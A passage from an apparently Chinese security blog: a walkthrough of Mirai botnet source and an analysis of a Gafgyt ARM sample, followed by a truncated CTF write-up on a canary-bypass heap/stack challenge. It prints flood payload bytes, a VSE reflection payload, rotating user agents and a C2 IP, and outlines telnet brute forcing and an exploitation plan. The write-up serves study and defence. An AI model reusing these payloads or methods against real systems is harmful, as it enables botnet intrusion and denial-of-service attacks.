title="dlr"></a>dlr</h3><p>dlr中没有main()只有run()函数。这个文件做的事情非常简单，连接黑客服务器并通过HTTP请求的方式获取病毒文件。黑客在这个过程中会发送0x0d0a0d0a用来表示何时开始发送正真的病毒本体。这种下载方式只有在使用wget或者tftp命令无法下载文件时才会使用。</p><p><img src="/2023/02/05/mirai/image-20230203221746035.png" alt="image-20230203221746035"></p><h3 id="server-create"><a href="#server-create" class="headerlink" title="server create"></a>server create</h3><p>生成一个<strong>具有固定IP</strong>的server，用来测试被攻击者是否能够正常使用wget或者tftp来接受远程文件。这个固定IP是<strong>100.200.100.100</strong>，当然在开源软件中可能是伪造的。源代码显示这属于一种比较经典的多线程服务器的初始化工作。有多个工作线程(CPU核数个)，然后支持的最多连接数量是1024*64个。</p><p><img src="/2023/02/05/mirai/image-20230204085712405.png" alt="image-20230204085712405"></p><p>在worker()函数中调用了handle_event()。这里是在与目标设备成功建立telnet连接之后尝试爆破密码的地方。首先服务器会判断连接状态，是否能够读取数据，然后根据连接回显的内容判断连接处于的状态。之后根据回显的提示符，输入用户名或者口令，然后根据回显结果判断是否弱口令爆破成功。这里的弱口令是黑客提供的，记录的内容是(ip:端口 用户名:密码 架构)。</p><p><img src="/2023/02/05/mirai/image-20230204132544791.png" alt="image-20230204132544791"></p><p>成功之后首先通过kill杀死所有包含init以及pid&gt;400的进程，并找到一段内存中的可读写空间，如果找到就生成一个可写文件夹。之后根据用户输入或者主机种ELF文件格式来判断目标主机架构。</p><p>如果成功则用busybox通过wget，tftp或者echo下载自身(mirai病毒)。其中前两者都是从黑客服务器下载，echo则是通过黑客提供的下载器下载病毒。之后尝试运行病毒并获取其输出，验证有效性。这是server.c中handle_event线程的主要工作。</p><p><img src="/2023/02/05/mirai/image-20230204130842806.png" alt="image-20230204130842806"></p><h2 id="cnc"><a href="#cnc" class="headerlink" title="cnc"></a>cnc</h2><p>cnc下的文件主要用于接受黑客的指令。包括新建用户(估计这个是给暗网上用户使用的)，以及攻击的配置</p><p>cnc文件夹下的文件用来编译生成mirai病毒。在main.go中，可以看到mirai通过在端口23以及端口101上进行tcp监听。其中api端口为101，tel端口为23。</p><p><img src="/2023/02/05/mirai/image-20230204133030448.png" alt="image-20230204133030448"></p><h3 id="tel-handler"><a href="#tel-handler" class="headerlink" title="tel handler"></a>tel handler</h3><p>23号端口的tel handler用于接受黑客指令，包括用户名、用户口令，它可以用来创建一个新的bot或者一个新的用户。分别对应NewBot以及NewAdmin函数。其中23号端口用来接受添加用户，获取僵尸主机相关参数，101号端口用来接收实际的攻击指令，包括设置攻击类型，构造payload数据包。</p><p><img src="/2023/02/05/mirai/image-20230204134212910.png" alt="image-20230204134212910"></p><p>对于NewAdmin主要控制部分在admin.go中。有以下几种命令，主要是添加一个管理僵尸主机的用户，显示bot连接状态信息，并设置攻击参数。</p><table><thead><tr><th>命令名称</th><th>命令用途</th></tr></thead><tbody><tr><td>adduser</td><td>设置用户名、密码、bot数量、攻击持续时间、攻击冷却时间</td></tr><tr><td>botcount</td><td>显示bot状态信息</td></tr><tr><td>-</td><td>指定多少僵尸网络发起攻击</td></tr><tr><td>@</td><td>指定发送的payload</td></tr></tbody></table><p>对于NewBot，只是为一个Bot结构体初始化。设置其连接信息，名称等。</p><h3 id="api-handler"><a href="#api-handler" class="headerlink" title="api handler"></a>api handler</h3><p>api handler主要接受用户对bot输入的用户名/密码，之后调用NewAttack执行用户输入的命令。</p><p><img src="/2023/02/05/mirai/image-20230204140803941.png" alt="image-20230204140803941"></p><p>在attack.go中，通过对一些参数组合进行设置，达到不同的攻击效果。这些参数用来把TCP数据包中不同部分设置为用户指定的值，修改其对应位置完成数据包payload编写。用户可以指定，也可以通过默认的方式输入。输入之后将会通过build()构建一个完整的攻击数据包。</p><p><img src="/2023/02/05/mirai/image-20230204142437106.png" alt="image-20230204142437106"></p><p>有一些现成的组合。达到不同的攻击效果。</p><p><img src="/2023/02/05/mirai/image-20230204142453246.png" alt="image-20230204142453246"></p><h2 id="Bot"><a href="#Bot" class="headerlink" title="Bot"></a>Bot</h2><p>bot部分主要是完成攻击以及发送心跳包等信息，最主要的函数是attack_init以及killer_init。</p><p>bot部分首先完成一些环境的清理。包括对watchdog进程发送防止重启的信号，隐藏自身进程名、argv[0]的行为，确保自己单进程运行。</p><p><img src="/2023/02/05/mirai/image-20230204145514125.png" alt="image-20230204145514125"></p><h3 id="attack-init"><a href="#attack-init" class="headerlink" title="attack_init"></a>attack_init</h3><p>接下来的attack_init和killer_init函数中完成的是真正的攻击部分。在attack_init中，初始化了一系列攻击函数。这部分攻击函数主要是根据我们上面的输入，构造真正的数据包。</p><p><img src="/2023/02/05/mirai/image-20230204151010647.png" alt="image-20230204151010647"></p><p>下面是一个例子。进行UDP攻击的过程。首先是从之前设置的内容中获取包中ttl、协议、源地址、目的地址等信息</p><p><img src="/2023/02/05/mirai/image-20230204151533301.png" alt="image-20230204151533301"></p><p>之后组装完整的数据包，并发送。</p><p><img src="/2023/02/05/mirai/image-20230204151724631.png" alt="image-20230204151724631"></p><p>其余的数据包构造方法大致类似，这里不再赘述。</p><h3 id="killer-init"><a href="#killer-init" class="headerlink" title="killer_init"></a>killer_init</h3><p>killer部分用于关闭一些进程，包括原先23号端口的telnet，22号端口的ssh，80端口的http。主要是为了维持自身的存在。</p><p><img src="/2023/02/05/mirai/image-20230204152232046.png" alt="image-20230204152232046"></p><p>在main.c的最后，bot会定时发送心跳信息，向黑客主机报告自身的存活。</p><p><img src="/2023/02/05/mirai/image-20230204153308599.png" alt="image-20230204153308599"></p><p>这次分析的是一个僵尸网络样本。原先的mirai样本因为架构过于奇怪u，无法正常分析，于是分析的市另一个ARM架构的文件。</p><h2 id="Gafgyt分析"><a href="#Gafgyt分析" class="headerlink" title="Gafgyt分析"></a>Gafgyt分析</h2><p>这里给的样本应该是一个僵尸网络样本。样本架构为32位arm，ELF文件格式。</p><p>首先在main()中，可以看到fork()出来一个子进程，并在子进程中进行连接。</p><p><img src="/2023/02/05/mirai/image-20230205094238880.png" alt="image-20230205094238880"></p><p>病毒会选择一个全局数组中的IP进行连接。如果没有初始设置端口，则默认链接6982端口。</p><p><img src="/2023/02/05/mirai/image-20230205094737090.png" alt="image-20230205094737090"></p><p>在样本中，数组中只有一个IP，连接到的是23号端口</p><p><img src="/2023/02/05/mirai/image-20230205094855243.png" alt="image-20230205094855243"></p><p>查询结果发现是越南的一个IP</p><p><img src="/2023/02/05/mirai/image-20230205094954675.png" alt="image-20230205094954675"></p><p>连接之后，病毒通过recvline()接受发来的命令，并做简单的修正(取最前面空格和最后面空格之间的内容作为命令)。命令开始的标记为”!”。之后病毒按照感叹号之后的内容将命令按照空格分割，保存在本地，并进入process_cmd中。</p><p><img src="/2023/02/05/mirai/image-20230205100936735.png" alt="image-20230205100936735"></p><p>在process_cmd中，可以看到一共有五种类型的攻击，分别是TCP、UDP、HTTP、VSE、STDHEX。病毒根据黑客的指令，在指令中找到上述五种字符串，以及IP地址，端口号、攻击事件、攻击次数信息，并分别fork()出子进程进行攻击。下面是TCP攻击部分。在攻击中，会采用随机IP地址的方法，自己构造IP数据包进行攻击。</p><p><img src="/2023/02/05/mirai/image-20230205104352207.png" alt="image-20230205104352207"></p><p>UDP数据包也是类似的行为。和TCP基本一致，不在说明了。接下来是HTTPSTOMP攻击。参数和上述UDP，TCP攻击时不同，是(HTTP行为，ip，端口，攻击次数，攻击时间)这里比较有意思的时他的payload，发送给/cdn-cgi/l/chk_captcha。是为了绕过cloud flare的captcha检查的。在这里，user_agent时一个随机内容，防止被过滤。</p><p><img src="/2023/02/05/mirai/image-20230205105343976.png" alt="image-20230205105343976"></p><p>HTTPpayload如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> http_payload[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, </span><br><span class="line">  <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, </span><br><span class="line">  <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, </span><br><span class="line">  <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x9C</span>, </span><br><span class="line">  <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x84</span>, <span class="number">0x8B</span>, <span class="number">0x87</span>, <span class="number">0x8F</span>, <span class="number">0x99</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0xEA</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随机的user_agent内容</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36</span><br><span class="line">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36</span><br></pre></td></tr></table></figure><p>对于VSE攻击，发送了一串很有意思的payload。VSE攻击是针对VSE服务器的一种请求，它被用来去攻击一些游戏中心。它的作用是不停的像游戏中心发送连接请求，导致其中断服务。下面的payload是用于针对此类服务器的。这一段payload能够引起DrDoS攻击，也即分布式反射性拒绝服务攻击，会导致许多受害者及其在不知情的情况下参与到DDoS攻击当中。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TSource Engine Query + </span><br><span class="line">/x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/</span><br><span class="line">x75/x65/x72/x79 rfdknjms</span><br></pre></td></tr></table></figure><p><img src="/2023/02/05/mirai/image-20230205115757613.png" alt="image-20230205115757613"></p><p>最后一个攻击在样本中的字符串为”STDHEX”。他的内容仅仅是发送一串固定payload。经过网上搜索，这是一串没有意义的payload，不过可以根据此payload搜索到很接近本样本的<a href="https://github.com/USBBios/Mortem-qBot-Botnet-Src/blob/main/bot.c">开源代码</a></p><p><img src="/2023/02/05/mirai/image-20230205120803712.png" alt="image-20230205120803712"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本样本的功能比较单一，是远控样本，能够接受攻击者发来的命令，通过fork出子进程，进行HTTP、TCP、UDP、VSE以及发送固定无意义内容的攻击。其中攻击者可以指定攻击的目的IP，目的端口，攻击时间，数据包大小等信息。</p><p>C2回连信息存在于样本中。IP为<code>103.195.237.238</code>。域名来自越南胡志明市。样本不存在横向扩展功能，不存在持久化功能。也不存在反调试、反沙箱的手段。</p>]]></content>
      
      
      <categories>
          
          <category> malware </category>
          
      </categories>
      
      
        <tags>
            
            <tag> botnet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>corctf2022-corchat</title>
      <link href="/2023/01/26/corctf2022-corchat/"/>
      <url>/2023/01/26/corctf2022-corchat/</url>
      
        <content type="html"><![CDATA[<p>来自corctf2022的一道corchat。当时是六月份，就顾着培训了，都没有来得及好好看看题目。听说这道题比较好就来学习一下。这道题难度不高，但是很有意思。和之前刚接触的一道覆盖<code>$fs_base</code>的题目是一样的想法。(后来才知道，原来这种方式叫做覆盖master canary，在多线程题目里面还挺常用的)</p><span id="more"></span><h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>出题方给了我们<a href="https://github.com/Nicholas-wei/pwn/tree/main/corctf2022">源代码</a>非常nice。有高质量CTF比赛的水准。事实上题目也出的挺好的。</p><h2 id="server-cpp"><a href="#server-cpp" class="headerlink" title="server.cpp"></a>server.cpp</h2><p>简单分析发现server创建了两个线程，一个用来监听新的连接(主线程)，另一个用来处理之前已经连接过的线程发送的消息等内容。这个server的逻辑是</p><ul><li>接受至多四个socket的连接</li><li>对于每一个socket发送的消息，将会广播到所有socket</li><li>注意这个里面的<code>Recv()</code>和<code>Send()</code>和现实中是反过来的，实际上分别是server端的发送和接受。这个只要仔细看一下代码也可以明白。</li></ul><p>文件保护全开，并且没有给libc。意味着可能是栈方面的漏洞，并且不仅是简单的触发。</p><p><img src="/2023/01/26/corctf2022-corchat/image-20230126212105559.png" alt="image-20230126212105559"></p><p>对于client\server类型的题目，我接触的并不多，但是大部分都会提供源码，并且很有意思。之前有一个coroutine的hack，当时比赛也没有做出来，也是很有意思的题目，改天可以把它补上，在这里写一下。</p><h1 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h1><p>我们重点关注下面几个函数。<code>send()</code>是发送给每个client的一个包装函数。这里会输出msg的内容，想到是否能够输出canary。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Crusader::SendMsg</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg, <span class="type">size_t</span> msg_len, <span class="type">int8_t</span> sender_id)</span> <span class="comment">// 这个是向某一个用户发送消息</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (sender_id == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> send(this-&gt;m_sock_fd, msg, msg_len, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;  <span class="comment">// 这边输出似乎可以写caanry，之后修改返回地址即可</span></span><br><span class="line">    <span class="keyword">return</span> send(this-&gt;m_sock_fd, msg, msg_len, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>RecvMessage</code>中，存在一个还算是比较明显的整数溢出的漏洞。经过调试发现第18行的大小检查完全是没用的(因为是无符号数)。第17行修改了<code>len</code>，而<code>len</code>是我们可控的，并且是无符号数。由于<code>sizeof(msg_buf.flags)</code>恒为2.因此如果我们一开始发送的长度为1，那么就可以溢出，写<code>0xffff</code>和字符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">Crusader::RecvMessage</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> msg = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    cor_msg_buf msg_buf; <span class="comment">// 大小为1024</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg_buf.buffer, <span class="string">&#x27;\x00&#x27;</span>, <span class="keyword">sizeof</span>(msg_buf.buffer));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(this-&gt;m_sock_fd, &amp;msg_buf.len, <span class="keyword">sizeof</span>(msg_buf.len)) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_buf.len &gt;= <span class="keyword">sizeof</span>(msg_buf.buffer) || msg_buf.len == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(this-&gt;m_sock_fd, &amp;msg_buf.flags, <span class="keyword">sizeof</span>(msg_buf.flags)) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">    msg_buf.len -= <span class="keyword">sizeof</span>(msg_buf.flags); <span class="comment">// 是否会导致整数溢出？会，这里是一个buffer overflow。可能可以修改下一个结构体的buffer</span></span><br><span class="line">    <span class="keyword">if</span> (msg_buf.len &lt;= <span class="number">0</span>) <span class="comment">// unsigned int不会触发</span></span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(this-&gt;m_sock_fd, msg_buf.buffer, msg_buf.len) &lt;= <span class="number">0</span>) <span class="comment">//读入0xffff字节,属于本地栈</span></span><br><span class="line">        <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">    msg_buf.buffer[msg_buf.len] = <span class="string">&#x27;\x00&#x27;</span>; <span class="comment">// 这会导致无法泄露？不一定，这是写在固定的地方，不会影响canary的输出。用buffer把这边的长度改成对应地址可写即可。但是这里是一个任意地址写0.因为msg_buf.len是我们可控的</span></span><br><span class="line">    msg += msg_buf.buffer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是事情并不是那么简单。首先通过调试发现，尽管能写入<code>0xffff</code>个字符，我们并不能覆盖到libc，只能覆盖到libc里面不可写的地方。</p><p><img src="/2023/01/26/corctf2022-corchat/image-20230126212544723.png" alt="image-20230126212544723"></p><p>这意味着我们任意地址写不能管用。其次，还需要应对<code>canary</code>。事实上，早在2015年就有一位研究人员(他当时才16岁…惭愧)提出了多线程下(不是多线程其实也可以)<a href="https://www.slideshare.net/codeblue_jp/master-canary-forging-by-yuki-koike-code-blue-2015">覆盖<strong>master canary</strong>的方法</a>。事实上，就是去写<code>$fs_base</code>对应的canary的内容。但是可能你会觉得，那写了master canary，异或的结果不是还是非0吗？这就是这道题的巧妙之处：我们不仅能写master canary，还能写本地栈的canary。这样每次修改一个byte，就能在八次情况下绕过canary的检查。</p><h2 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h2><p>注意到上面的代码中，我们还有一个任意地址写0的操作。是因为当我们覆盖完下面结构体的<code>buffer</code>之后，还能接着覆盖后面的<code>len</code>。从而控制一个到和当前buffer距离0到<code>0xffff</code>的地方写入一个0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">uint16_t</span> flags;</span><br><span class="line">    <span class="type">uint16_t</span> len;</span><br><span class="line">&#125; cor_msg_buf;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任意地址写0</span></span><br><span class="line">msg_buf.buffer[msg_buf.len] = <span class="string">&#x27;\x00&#x27;</span>;</span><br></pre></td></tr></table></figure><p>诶，想到<code>master canary</code>（我太菜了，没想到）事实上master canary一般是在libc之上，比较接近libc的一块区域。<strong>我们在能对libc附近读写之后可以考虑写master canary</strong>。然后一看距离，发现确实是在可控范围之内的。和buffer的偏移是3448。</p><p>因此我们的思路可以是：</p><ul><li>通过整数溢出修改可写字节长度为0xffff</li><li>在溢出同时，写len字段来给canary写0，同时溢出控制本地栈的canary末尾也是0</li><li>重复八次(注意每次中间需要sleep，否则会出问题)</li></ul><p>之后就能得到一个全为0的fs:0x28了。</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>在绕过canary之后，我们可以考虑泄露。实际上结合<code>sendMsg</code>发消息的逻辑，只要控制溢出连带输出libc上面的一些libc地址就能够完成获取libc偏移了。但是这道题给了我们一个后门函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DoAdmin</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">int8_t</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *p;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    p = popen(cmd, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    